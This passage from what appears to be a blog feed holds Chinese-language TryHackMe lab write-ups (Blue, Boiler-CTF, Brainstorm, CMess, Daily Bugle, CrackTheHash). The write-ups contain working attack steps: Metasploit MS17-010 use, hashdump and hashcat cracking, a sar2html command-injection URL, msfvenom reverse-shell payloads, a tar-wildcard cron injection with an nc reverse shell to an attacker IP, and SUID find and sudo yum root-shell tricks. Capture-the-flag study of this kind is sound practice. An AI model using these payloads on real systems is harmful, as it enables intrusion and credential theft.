<p>成功利用之后会打开一个cmd终端,在这个终端里面,我们就是管理员了.最终拿到flag</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200505_131056.jpg" alt="root"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>UAC-PASS</tag>
        <tag>CVE-2019-1388</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Blue</title>
    <url>/2020/04/14/TryHackMe-Blue/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>同样这个靶机也是没什么难度的。。</p>
<p>靶机难度：十分简单</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC --script vuln -oN blue.nmap 192.168.56.127</span><br></pre></td></tr></table></figure>

<p>参数详解</p>
<blockquote>
<p>-sV 系统服务详细信息<br>-oN 标准nmap输出<br>-sC 使用脚本探测</p>
</blockquote>
<p><img src="https://images.atsud0.me/images/post/47662367e3a94f61884695f7f3344f1f.png" alt=""></p>
<p>探测之后发现，系统可能可以被<strong>ms17_010</strong>漏洞影响</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用metasploit，进行简单的漏洞利用</p>
<p><img src="https://images.atsud0.me/images/post/b16eb40d6c5a41b48a61686fd81777ac.png" alt=""></p>
<p>设置好后靶机IP后，可以直接使用<code>run/exploit</code>运行了</p>
<p>RHOST – 靶机IP<br>RPORT – 靶机服务端口</p>
<p><img src="https://images.atsud0.me/images/post/a3ca76eb751b41bebc0462575141ab5b.png" alt=""></p>
<p>获得shell之后，查看当前权限，之后将当前使用shell_to_metasploit升级shell</p>
<p><img src="https://images.atsud0.me/images/post/df172c35b70142399213ab5a1163d3b4.png" alt=""></p>
<p>设置好lhost，lport，session运行。</p>
<p><img src="https://images.atsud0.me/images/post/1503874334be412cb3eefd233dc53e95.png" alt=""></p>
<p>使用<code>sessions -i 2</code>与会话窗口2交互</p>
<p>使用ps -ef查看进程，然后使用migrate迁移进程，使进程更稳定(不容易被杀掉</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; migrate 448</span><br><span class="line">[*] Migrating from 1204 to 448...</span><br><span class="line">[*] Migration completed successfully.</span><br></pre></td></tr></table></figure>
<p>有可能会迁移不成功，会有权限不足的提示，尝试另外的进程。</p>
<blockquote>
<p>Q:为什么我进程迁移之后退出msf,重新打开就没了?<br>A:进程迁移只是让你的sesion换个进程，不能改变session的本质，它只是一次会话，迁移进程是为了让它更稳定,不易被断掉,或者利用进程的其他属性,并不能让他变成一个存储在目标硬盘上的永久文件,,如果你想暂时搁置这个sesion,应该使用background命令,暂时后台,并且不要退出msf,.当你需要调出这个session时,使用sessions -l 查看当前所有会话,使用 sessions -i 加上对应会话序号,可以调出session(by 夏姐姐 </p>
</blockquote>
<h3 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h3><p>使用<code>hashdump</code>获得目标机器用户的hash值密码，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; hashdump </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">J0n:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line">Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::</span><br></pre></td></tr></table></figure>
<blockquote>
<p>J0n是我后面提权生成的用户</p>
</blockquote>
<p>在Kali中，使用hashcat 破解获取到的haash密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 ffb43f0de35be4d9917ac0cc8ad57f8d ..&#x2F;rockyou.txt -o res.txt --force -m 1000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: NTLM</span><br><span class="line">Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d</span><br><span class="line">Time.Started.....: Fri Apr 10 04:34:12 2020 (5 secs)</span><br><span class="line">Time.Estimated...: Fri Apr 10 04:34:17 2020 (0 secs)</span><br><span class="line">Guess.Base.......: File (..&#x2F;rockyou.txt)</span><br><span class="line">Guess.Queue......: 1&#x2F;1 (100.00%)</span><br><span class="line">Speed.#1.........:  1908.0 kH&#x2F;s (0.22ms) @ Accel:1024 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1&#x2F;1 (100.00%) Digests, 1&#x2F;1 (100.00%) Salts</span><br><span class="line">Progress.........: 10201088&#x2F;14344385 (71.12%)</span><br><span class="line">Rejected.........: 0&#x2F;10201088 (0.00%)</span><br><span class="line">Restore.Point....: 10200064&#x2F;14344385 (71.11%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidates.#1....: alread852 -&gt; alphasarto11</span><br></pre></td></tr></table></figure>

<p>参数：</p>
<blockquote>
<p>-a 爆破模式<br>-o 输出文件<br>–force 强制执行<br>-m NTLM密码 Windows</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat res.txt </span><br><span class="line">ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22</span><br></pre></td></tr></table></figure>


<p>找到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; search -f &quot;flag*.txt&quot;</span><br><span class="line">Found 3 results...</span><br><span class="line">    c:\flag1.txt (24 bytes)</span><br><span class="line">    c:\Users\Jon\Documents\flag3.txt (37 bytes)</span><br><span class="line">    c:\Windows\System32\config\flag2.txt (34 bytes)</span><br></pre></td></tr></table></figure>

<p>这里我不知道为什么直接尝试进入<code>c:\Users\Jon\Documents</code>会提示权限不足.所以我就只能尝试提权,使用<code>getsystem</code>提权，或者使用<code>run post/windows/manage/enable_rdp USERNAME=J0n PASSWORD=12345</code>生成远程用户，远程进去也能看。</p>
<blockquote>
<p>根据朋友的说法这里可以直接进入cmd中查看该文件,不需要进行提权</p>
</blockquote>
<h3 id="不使用msf的情况下利用永恒之蓝"><a href="#不使用msf的情况下利用永恒之蓝" class="headerlink" title="不使用msf的情况下利用永恒之蓝"></a>不使用msf的情况下利用永恒之蓝</h3><p>施工中。。本废物暂无思路。<br><img src="https://images.atsud0.me/images/post/image-1586576193417.png" alt="file"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Metasploit</tag>
        <tag>MS17_010</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Boiler-CTF</title>
    <url>/2020/06/14/TryHackMe-Boiler-CTF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><a href="https://tryhackme.com/room/boilerctf2" title="" target="">在线靶机</a>

<p>一个不算难，但是很绕的靶机。</p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描结果<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_183642.jpg" alt=""></p>
<ul>
<li>21:ftp</li>
<li>80:http apache</li>
<li>10000:http webmin</li>
<li>55007:ssh</li>
</ul>
<p>10000端口的webmin版本是1.930好像没有exploit可以利用。</p>
<p>发现有ftp服务，尝试用匿名用户登录成功，不过里面只有一个文件<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_184431.jpg" alt=""><br>解密后发现，这是段没什么用的信息。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_184540.jpg" alt=""><br>我当然知道枚举是关键啊！岂可修</p>
<p>路径探测<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_222345.jpg" alt=""></p>
<p>joomla版本探测<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_193855.jpg" alt=""></p>
<p>joomla路径探测<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_222439.jpg" alt=""><br>可以看到有五个结果是很奇怪的，我们可以去访问看看。</p>
<p>~www<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_223106.jpg" alt=""></p>
<p>_files<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_223137.jpg" alt=""><br>两次base64解密后内容为Whopsie daisy</p>
<p>_archive<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_223243.jpg" alt=""></p>
<p>_database<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_223319.jpg" alt=""><br>key=24 just messing around.</p>
<p>_test<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_223418.jpg" alt=""></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>就test的十分特别。。是个什么sar2html。不知道是什么东西，先谷歌一波。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_223618.jpg" alt=""><br>看起来突破点，就是在这里了。居然有远程代码执行的漏洞。根据expdb给出的payload就是以下内容<br><code>http://10.10.221.147/joomla/_test/index.php?plot=LINUX;&lt;command&gt;</code><br>执行之后选择主机下拉就能看到命令的输出了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_224250.jpg" alt=""></p>
<p>这里我尝试了直接wget一句话但是不成功，尝试能用echo输出生成文件后，试着直接写shell。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_225155.jpg" alt=""><br>执行好之后，ls看看有没有生成。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_225407.jpg" alt=""></p>
<p>看起来是成功了，访问1.php也有phpinfo的信息，可以尝试蚁剑连上去了。连上去后，到处随便看看，结果在_test的目录下的log.txt就看到了一个密码。。根据日志，看起来就是basterd用户的帐号密码。。所以其实可以不用写shell的。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_225501.jpg" alt=""></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>直接ssh连接上去后，basterd的家目录下就有一个backup.sh的文件，不得了不得了。直接把另外一个用户的密码都给出来了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_225941.jpg" alt=""><br>切换到stoner用户后，就可以拿到第一个flag了。flag就是.secret文件的内容。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_230210.jpg" alt=""><br>说实话，我完全不知道这是什么东西。先搜索下suid位文件吧。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_230325.jpg" alt=""></p>
<p>喔喔，有个find。那就好办了</p>
<figure class="highlight shell"><figcaption><span>exploit</span></figcaption><table><tr><td class="code"><pre><span class="line">find . -exec /bin/sh -p \;</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200614_230523.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>就如开头ftp找到的文件所说的一样，枚举是关键。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>sar2html</tag>
        <tag>GTFOBins-find</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Brainstorm</title>
    <url>/2020/07/04/TryHackMe-Brainstorm/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="https://tryhackme.com/room/brainstorm" target="_blank" rel="noopener">靶机链接</a></p>
<p>这是我做的第二个缓冲区溢出的靶机,经过<a href="https://atsud0.me/2020/06/25/Vulnhub-brainpan-1/">Vulnhub-brainpan-1</a>的洗礼,在缓冲区溢出方面,我已经比之前有很大的进步了.</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nmap -p- -T5 10.10.38.185</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-02 15:41 UTC</span><br><span class="line">Nmap scan report for ip-10-10-38-185.eu-west-1.compute.internal (10.10.38.185)</span><br><span class="line">Host is up (0.00054s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21&#x2F;tcp   open  ftp</span><br><span class="line">3389&#x2F;tcp open  ms-wbt-server</span><br><span class="line">9999&#x2F;tcp open  abyss</span><br><span class="line">MAC Address: 02:02:F2:76:F9:D2 (Unknown)</span><br></pre></td></tr></table></figure>

<p>目标机器直接就是windows服务器。</p>
<p>因为ftp允许匿名用户登录，所以可以用ftp匿名用户登录后，查看发现两个文件</p>
<ul>
<li>chatserver.exe</li>
<li>essfunc.dll</li>
</ul>
<p>在下载这里我要说一下。最好设置一下ftp的传输方式。一开始因为我没有设置传输方式，下载完又没认真看错误提示，程序在XP64位无法执行，我甚至尝试了XP32 Win764 32，都不成功。导致我以为是靶机提供的程序有问题，直到最后回去下载的时候发现已经提示了程序有可能无法执行。。直到最后谷歌了这个错误信息，才找到了<a href="https://blog.csdn.net/zengmingen/article/details/78604574" target="_blank" rel="noopener">解决方案</a>。<br><img src="https://images.atsud0.me/images/post/232211aa.png" alt=""></p>
<p>成功下载后，丢在Windows XP上运行。</p>
<p>因为在<a href="https://atsud0.me/2020/06/25/Vulnhub-brainpan-1/">Vulnhub-brainpan-1</a>中写的已经很清楚了，和这个程序几乎一样，只需要注意几个细节。这个程序的注意点在于：</p>
<ul>
<li>跳转esp的内存地址要在essfunc.dll中寻找</li>
<li>先打印两次，输入一次，再打印一次，再输入。最后一次的输入，才是我们要进行的溢出点。</li>
</ul>
<p>shellcode生成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;10.11.3.34 LPORT&#x3D;1234 -f py -b&quot;\x08\x09\x00&quot; -e x86&#x2F;shikata_ga_nai</span><br></pre></td></tr></table></figure>

<p>最后<br><img src="https://images.atsud0.me/images/post/Screenshot_20200704_002932.jpg" alt=""></p>
<p>一个小时就做完了，成就感还蛮大的。。。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Buffer Overflow</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-CMess</title>
    <url>/2020/06/14/TryHackMe-CMesS/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><a href="https://tryhackme.com/room/cmess" title="" target="">在线靶场链接</a>

<a id="more"></a>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_115010.jpg" alt=""><br>首先把ip cmess.thm的域名添加上/etc/hosts，先爆破子域名（因为看到了提示…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-5000.txt -u &quot;http:&#x2F;&#x2F;cmess.thm&#x2F;&quot; -H &quot;Host: FUZZ.cmess.thm&quot; --hl 107</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200614_120133.jpg" alt=""><br>wfuzz 爆破子域后，将被爆破出来的子域名添加上/etc/hosts上</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200607_221218.jpg" alt=""></p>
<h2 id="脆弱利用"><a href="#脆弱利用" class="headerlink" title="脆弱利用"></a>脆弱利用</h2><p>通过找到的帐号密码，登录上来后搜索一番，找到了上传路径（没有任何过滤的。上传一句话或者是php-reverse-shell，连接上去后。发现andre用户是没有权限进去的，搜索属于该用户的文件也没找到有价值的东西，最后在/opt下面发现了一个奇怪的文件。。找到andre的密码，可以直接ssh连接上去了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_221736.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user-flag：***&#123;********************************&#125;</span><br></pre></td></tr></table></figure>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看<code>sudo -l</code>无果，但是在<code>/etc/crontab</code>下看到了这个定时任务。有通配符的tar~<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_222511.jpg" alt=""></p>
<p>tar wildcar注入走起~<a href="/2020/04/14/Linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/" title="Linux提权方式">Linux提权方式</a></p>
<p>第三个的payload，替换成自己用msfvenom生成的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_netcat LHOST&#x3D;your_ip LPORT&#x3D;8888 R</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><figcaption><span>payload</span></figcaption><table><tr><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">echo ""&gt;"--checkpoint-action=exec=sh shell.sh"</span><br><span class="line">echo ""&gt;"--checkpoint=1"</span><br><span class="line">echo "mkfifo /tmp/cflw;nc your_ip 8888 0&lt;/tmp/clfw |/bin/sh &gt;/tmp/cflw 2&gt;&amp;1"&gt;shell.sh</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200607_223455.jpg" alt=""></p>
<p>倒杯茶，等待两分钟。你就能拿到root权限了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_223627.jpg" alt=""></p>
<p>拿到root权限<br><img src="https://images.atsud0.me/images/post/Screenshot_20200607_223655.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root-flag:***&#123;********************************&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学习了一下wfuzz的基本使用，顺带复习了tar通配符提权。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>wfuzz</tag>
        <tag>msf</tag>
        <tag>tar wildcard</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Daily Bungle</title>
    <url>/2020/05/19/TryHackMe-Daily-Bungle/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><a href="https://tryhackme.com/room/dailybugle" title="" target="">靶机链接:dailybugle</a>.

<p>靶机难度:中等</p>
<p>本文涉及:</p>
<ul>
<li>Sqlmap</li>
<li>sudo-yum提权</li>
<li>Joomla后台get-shell</li>
</ul>
<a id="more"></a>


<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ports=$(nmap -p- --min-rate=1000  -T4 10.10.85.231 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)</span><br><span class="line"></span><br><span class="line">nmap -sC -sV -p$ports 10.10.190.185</span><br></pre></td></tr></table></figure>

<p>扫描端口后，发现目标只开放了两个端口。并且http服务探测检测到这是个<code>Joomla</code>开源评论管理系统。具体是什么东西，我不知道。。不过先扫描下网站路径，和访问下网站。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_195816.jpg" alt="nmap"></p>
<p>路径探测结果:<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_185838.jpg" alt="dirb"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200519_195845.jpg" alt="login"></p>
<p><code>/administrator</code>是后台登录页面<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_185957.jpg" alt="index"></p>
<p>用kali自带的searchsploit看看这个joomla有没有exploit。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200519_190249.jpg" alt="search-exp"></p>
<p>结果多到显示不完。。不过我们不知道它的版本号。不知道准确的版本号，也就不知道该使用什么<code>exploit</code>谷歌了一下后，发现msf有扫描joomla版本的脚本。直接上msf。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200519_190508.jpg" alt="msf"></p>
<p>结果显示是<code>3.7.0</code>。那么就来搜索一下3.7.0的exploit。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_191735.jpg" alt="3.7.0"></p>
<p>好起来了，是一个sqli注入的漏洞。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_191844.jpg" alt="sqli"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>好，直接使用sqlmap跑起来。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u "http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200519_192036.jpg" alt="dbs"></p>
<p>表真多，不过没啥问题。我们已经找到我们想要的了<code>#__users</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_192133.jpg" alt="tables"></p>
<p>接下来该取数据了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_192244.jpg" alt="dump"></p>
<p>还是加密的。这是<code>bcrypt</code>php的密码加密哈希值。这里就让john去跑吧。</p>
<p>直接这样的话是不行的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john $2y$.......... --wordlist&#x3D;...</span><br></pre></td></tr></table></figure>
<p>我们要把哈希值写到一个文件里面，让john从这个文件读取去跑。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_192635.jpg" alt="password"></p>
<p>用这个密码，登录到后台。找到上传点直接写一句话，然后蚁剑伺候。（类似wordpress修改模板文件的地方。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_192800.jpg" alt="upload"></p>
<p>蚁剑连接成功！<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_192927.jpg" alt="ant"><br>一进来就看到一个文件，十分吸引人。<code>configuration.php</code>这里说不定有管理员的密码。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200519_193824.jpg" alt="password"></p>
<p>这里有两个字符串，长的都很像密码，一个个试。password字段的肯定是一个mysql的密码。</p>
<p>获取用户名。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_193558.jpg" alt="home"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>直接ssh连接，成功登录<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_194005.jpg" alt="user"></p>
<p>拿到第一个flag，同时我们也知道了<code>yum</code>拥有<code>sudo</code>权限。让我们去看下<code>yum</code>有什么提权姿势</p>
<blockquote><p>It runs commands using a specially crafted RPM package. Generate it with fpm and upload it to the target.</p>
<footer><strong>gtfobins</strong><cite><a href="https://gtfobins.github.io/gtfobins/yum/" target="_blank" rel="noopener">gtfobins-sudo-yum</a></cite></footer></blockquote>


<figure class="highlight plain"><figcaption><span>yum</span><a href="https://gtfobins.github.io/gtfobins/yum/" target="_blank" rel="noopener">shell</a></figcaption><table><tr><td class="code"><pre><span class="line">TF&#x3D;$(mktemp -d)</span><br><span class="line">echo &#39;id&#39; &gt; $TF&#x2F;x.sh</span><br><span class="line">fpm -n x -s dir -t rpm -a all --before-install $TF&#x2F;x.sh $TF</span><br><span class="line"></span><br><span class="line">sudo yum localinstall -y x-1.0-1.noarch.rpm</span><br></pre></td></tr></table></figure>

<blockquote><p>Spawn interactive root shell by loading a custom plugin.</p>
<footer><strong>gtfobins</strong><cite><a href="https://gtfobins.github.io/gtfobins/yum/" target="_blank" rel="noopener">gtfobins-sudo-yum</a></cite></footer></blockquote>

<figure class="highlight plain"><figcaption><span>yum</span><a href="https://gtfobins.github.io/gtfobins/yum/" target="_blank" rel="noopener">shell</a></figcaption><table><tr><td class="code"><pre><span class="line">TF&#x3D;$(mktemp -d)</span><br><span class="line">cat &gt;$TF&#x2F;x&lt;&lt;EOF</span><br><span class="line">[main]</span><br><span class="line">plugins&#x3D;1</span><br><span class="line">pluginpath&#x3D;$TF</span><br><span class="line">pluginconfpath&#x3D;$TF</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &gt;$TF&#x2F;y.conf&lt;&lt;EOF</span><br><span class="line">[main]</span><br><span class="line">enabled&#x3D;1</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &gt;$TF&#x2F;y.py&lt;&lt;EOF</span><br><span class="line">import os</span><br><span class="line">import yum</span><br><span class="line">from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE</span><br><span class="line">requires_api_version&#x3D;&#39;2.1&#39;</span><br><span class="line">def init_hook(conduit):</span><br><span class="line">os.execl(&#39;&#x2F;bin&#x2F;sh&#39;,&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sudo yum -c $TF&#x2F;x --enableplugin&#x3D;y</span><br></pre></td></tr></table></figure>

<p>第一个fpm是不行的，因为目标环境没有fpm。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_195135.jpg" alt="root"></p>
<p>可以看到，我们已经拿到<code>root.flag</code>了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学会了</p>
<ul>
<li>yum的提权方式</li>
<li>joomla修改模板文件的地方</li>
</ul>
<p>参考链接:</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/38498460" title="" target="">旋风火鸡:Joomla渗透测试攻略</a>.</li>
<li><a href="https://laptrinhx.com/joomla-reverse-shell-503628992/" title="" target="">Joomla: Reverse Shell</a>

</li>
</ul>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>GTFOBins-yum</tag>
        <tag>Joomla</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-CrackTheHash</title>
    <url>/2020/05/07/TryHackMe-CrackTheHash/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>练习有关使用hashcat的小习题</p>
<p><a href="https://tryhackme.com/room/crackthehash" target="_blank" rel="noopener">CrackTheHash</a></p>
<a id="more"></a>

<p>会用到的网站:<br><a href="https://crackstation.net/" target="_blank" rel="noopener">crackonline</a><br><a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener">hashcat_mode</a></p>
<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><h2 id="1-MD5"><a href="#1-MD5" class="headerlink" title="1 MD5"></a>1 MD5</h2><p>hash-identifier:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> HASH: 48bb6e862e54f2a795ffc4e541caed4d</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] RAdmin v2.x</span><br><span class="line">[+] NTLM</span><br><span class="line">[+] MD4</span><br><span class="line">[+] MD2</span><br><span class="line">[+] MD5(HMAC)</span><br><span class="line">[+] MD4(HMAC)</span><br><span class="line">[+] MD2(HMAC)</span><br><span class="line">[+] MD5(HMAC(Wordpress))</span><br><span class="line">[+] Haval-128</span><br><span class="line">[+] Haval-128(HMAC)</span><br><span class="line">[+] RipeMD-128</span><br><span class="line">[+] RipeMD-128(HMAC)</span><br><span class="line">[+] SNEFRU-128</span><br><span class="line">[+] SNEFRU-128(HMAC)</span><br><span class="line">[+] Tiger-128</span><br><span class="line">[+] Tiger-128(HMAC)</span><br><span class="line">[+] md5($pass.$salt)</span><br><span class="line">[+] md5($salt.$pass)</span><br><span class="line">[+] md5($salt.$pass.$salt)</span><br><span class="line">[+] md5($salt.$pass.$username)</span><br><span class="line">[+] md5($salt.md5($pass))</span><br><span class="line">[+] md5($salt.md5($pass))</span><br><span class="line">[+] md5($salt.md5($pass.$salt))</span><br><span class="line">[+] md5($salt.md5($pass.$salt))</span><br><span class="line">[+] md5($salt.md5($salt.$pass))</span><br><span class="line">[+] md5($salt.md5(md5($pass).$salt))</span><br><span class="line">[+] md5($username.0.$pass)</span><br><span class="line">[+] md5($username.LF.$pass)</span><br><span class="line">[+] md5($username.md5($pass).$salt)</span><br><span class="line">[+] md5(md5($pass))</span><br><span class="line">[+] md5(md5($pass).$salt)</span><br><span class="line">[+] 